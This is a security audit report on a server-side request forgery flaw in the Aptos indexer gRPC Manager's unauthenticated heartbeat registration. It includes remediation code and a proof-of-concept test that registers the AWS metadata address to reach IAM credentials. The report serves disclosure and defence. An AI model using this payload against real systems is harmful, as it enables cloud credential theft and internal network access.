# Audit Report

## Title
Server-Side Request Forgery (SSRF) via Unauthenticated Service Registration in Indexer gRPC Manager

## Summary
The Aptos indexer gRPC Manager accepts unauthenticated `HeartbeatRequest` messages containing arbitrary service addresses, which are stored without validation and subsequently returned to gateway clients via `get_data_service_for_request`. This enables attackers to inject malicious URLs that cause gateway servers to make requests to arbitrary internal or external endpoints, resulting in SSRF attacks.

## Finding Description

The vulnerability exists in the indexer gRPC service discovery mechanism. The attack flow is as follows:

**Step 1: Unauthenticated Heartbeat Endpoint**
The gRPC Manager exposes an unauthenticated `Heartbeat` RPC endpoint that accepts service registration information. [1](#0-0) 

The server is created without any authentication interceptor, making this endpoint publicly accessible.

**Step 2: Address Extraction Without Validation**
When a `HeartbeatRequest` is received, the address is extracted directly from the client-controlled `ServiceInfo` message: [2](#0-1) 

The address field is defined as a plain string in the protobuf definition: [3](#0-2) 

**Step 3: Unvalidated Storage**
The `MetadataManager` stores this address without any validationâ€”no network range checks, no allowlist verification, no URL sanitization: [4](#0-3) 

The `GrpcAddress` type provides no validation as it's just a string alias: [5](#0-4) 

**Step 4: Malicious Address Returned to Clients**
When a gateway requests a data service via `get_data_service_for_request`, the malicious address can be selected and returned: [6](#0-5) 

**Step 5: SSRF Execution at Gateway**
The gateway receives this address and uses it to proxy HTTP/2 requests without additional validation: [7](#0-6) 

The gateway server makes requests to the attacker-controlled URL, completing the SSRF attack.

**Attack Scenario Example:**
1. Attacker sends: `HeartbeatRequest` with `address="http://169.254.169.254/latest/meta-data/iam/security-credentials/"` (AWS metadata service)
2. Manager stores this address
3. Gateway requests a data service
4. Manager returns the malicious address
5. Gateway makes HTTP request to AWS metadata endpoint, leaking IAM credentials

## Impact Explanation

This vulnerability qualifies as **High Severity** according to Aptos bug bounty criteria:

1. **API Crashes**: Gateway servers may crash or become unresponsive when directed to invalid or malicious endpoints
2. **Significant Protocol Violations**: The service discovery mechanism is compromised, breaking trust assumptions about backend service endpoints
3. **Potential for Credential Theft**: Access to cloud metadata services (AWS EC2, GCP, Azure) can leak sensitive credentials and API keys
4. **Internal Network Exposure**: Attackers can probe and access internal services behind firewalls (databases, Redis, internal APIs)
5. **Port Scanning**: The gateway becomes a pivot point for mapping internal network infrastructure

While this doesn't directly affect consensus or validator operations, it compromises critical infrastructure components that support the blockchain's indexing and data access layer.

## Likelihood Explanation

**Likelihood: High**

- **No Authentication Required**: The heartbeat endpoint is completely unauthenticated
- **Trivial to Exploit**: Attacker only needs to send a single gRPC message with a malicious URL
- **No Rate Limiting Visible**: No code indicates rate limiting on heartbeat registration
- **Persistent Effect**: Once registered, the malicious address remains active until marked unreachable (60 second timeout)
- **Wide Attack Surface**: Any network peer can reach the gRPC Manager's public endpoint

The only limiting factor is that the attacker needs knowledge of the gRPC Manager's address and the gateway must be actively routing requests, both of which are typical in production deployments.

## Recommendation

Implement multi-layered validation and authentication:

**1. Add Authentication to Heartbeat Endpoint**
```rust
// In grpc_manager.rs, add authentication interceptor:
fn check_auth(req: Request<()>) -> Result<Request<()>, Status> {
    let token = req.metadata()
        .get("authorization")
        .and_then(|t| t.to_str().ok());
    
    match token {
        Some(t) if is_valid_token(t) => Ok(req),
        _ => Err(Status::unauthenticated("Invalid credentials"))
    }
}

// Modify server setup:
let service = GrpcManagerServer::new(GrpcManagerService::new(...))
    .with_interceptor(check_auth) // Add this line
    .send_compressed(CompressionEncoding::Zstd)
    // ... rest of config
```

**2. Validate Service Addresses**
```rust
// In metadata_manager.rs, add validation:
fn validate_address(address: &str) -> Result<()> {
    let url = Url::parse(address)
        .context("Invalid URL format")?;
    
    // Check scheme
    if url.scheme() != "http" && url.scheme() != "https" {
        bail!("Only HTTP/HTTPS schemes allowed");
    }
    
    // Check against allowlist
    let host = url.host_str()
        .context("Missing host")?;
    
    if is_private_ip(host) || is_metadata_service(host) {
        bail!("Private/metadata service addresses not allowed");
    }
    
    // Check against configured allowlist
    if !SERVICE_ADDRESS_ALLOWLIST.contains(host) {
        bail!("Address not in allowlist");
    }
    
    Ok(())
}

// Call in handle_heartbeat before storing:
validate_address(&address)?;
```

**3. Implement Network-Level Restrictions**
- Use network policies to restrict which addresses the gateway can connect to
- Implement egress filtering at the infrastructure level
- Use service mesh policies to enforce allowed backend services

**4. Add Monitoring and Alerting**
- Log all service registrations with source IP
- Alert on suspicious patterns (metadata service addresses, private IPs, rapid registrations)
- Implement rate limiting on heartbeat registration per source

## Proof of Concept

```rust
// Test demonstrating the vulnerability
#[tokio::test]
async fn test_ssrf_via_heartbeat() {
    use aptos_protos::indexer::v1::{
        grpc_manager_client::GrpcManagerClient,
        service_info::Info,
        HeartbeatRequest, ServiceInfo, LiveDataServiceInfo,
        GetDataServiceForRequestRequest,
    };
    
    // Start the gRPC Manager (assume test setup provides this)
    let manager_address = "http://localhost:50051";
    
    // Step 1: Attacker sends malicious heartbeat
    let mut client = GrpcManagerClient::connect(manager_address)
        .await
        .unwrap();
    
    let malicious_address = "http://169.254.169.254/latest/meta-data/";
    
    let heartbeat = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some(malicious_address.to_string()),
            info: Some(Info::LiveDataServiceInfo(LiveDataServiceInfo {
                chain_id: 1,
                timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
                known_latest_version: Some(1000),
                min_servable_version: Some(1),
                stream_info: None,
            })),
        }),
    };
    
    let response = client.heartbeat(heartbeat).await;
    assert!(response.is_ok(), "Malicious heartbeat was rejected");
    
    // Step 2: Verify the malicious address can be retrieved
    let get_service_request = GetDataServiceForRequestRequest {
        user_request: None,
    };
    
    let service_response = client
        .get_data_service_for_request(get_service_request)
        .await
        .unwrap()
        .into_inner();
    
    // The malicious address should be returned
    assert_eq!(
        service_response.data_service_address,
        malicious_address,
        "Malicious address was returned by get_data_service_for_request"
    );
    
    // In production, this address would now be used by the gateway
    // to proxy requests, causing SSRF
}
```

## Notes

This vulnerability exists in the indexer infrastructure layer, not the core consensus or Move VM components. However, it represents a significant security issue that could lead to:

- Compromise of cloud credentials via metadata service access
- Lateral movement within internal networks
- Information disclosure about internal infrastructure
- Denial of service by directing traffic to invalid endpoints

The lack of authentication on the service registration endpoint is particularly concerning as it allows any network actor to manipulate the service discovery mechanism. Combined with the absence of address validation, this creates a trivially exploitable SSRF vector that could impact the availability and security of the entire indexer infrastructure.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L92-100)
```rust
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L64-76)
```text
message ServiceInfo {
  optional string address = 1;
  oneof info {
      LiveDataServiceInfo live_data_service_info = 2;
      HistoricalDataServiceInfo historical_data_service_info = 3;
      FullnodeInfo fullnode_info = 4;
      GrpcManagerInfo grpc_manager_info = 5;
  }
}

message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L16-16)
```rust
pub(crate) type GrpcAddress = String;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L149-175)
```rust
    let url = Url::from_str(&response.data_service_address).unwrap();
    let mut req = Request::from_parts(head, body);
    req.extensions_mut().insert(url);
    Ok(next.run(req).await)
}

async fn proxy(
    data_service_url: Extension<Url>,
    mut request: Request,
) -> Result<Response, (StatusCode, String)> {
    info!(
        data_service_url = data_service_url.as_str(),
        "Proxying request to data service: {}",
        data_service_url.as_str()
    );
    *request.uri_mut() = override_uri_with_upstream_url(request.uri(), &data_service_url)?;

    Client::builder(TokioExecutor::new())
        .http2_only(true)
        .build_http()
        .request(request)
        .await
        .map(|res| {
            let (parts, body) = res.into_parts();
            Response::from_parts(parts, axum::body::Body::new(body))
        })
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))
```
